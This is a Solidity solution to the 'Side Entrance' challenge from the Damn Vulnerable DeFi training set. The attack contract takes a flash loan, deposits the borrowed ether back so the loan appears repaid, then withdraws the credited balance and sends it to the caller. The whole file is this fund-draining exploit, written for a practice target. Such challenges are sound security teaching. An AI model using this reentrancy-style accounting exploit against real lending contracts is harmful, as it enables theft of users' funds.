// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract HackSideEntranceLenderPool is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    receive() external payable {}

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
        pool.withdraw();
        (bool success,) = msg.sender.call{value: address(this).balance}("");
        require(success, "falied to transfer founds");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }


}
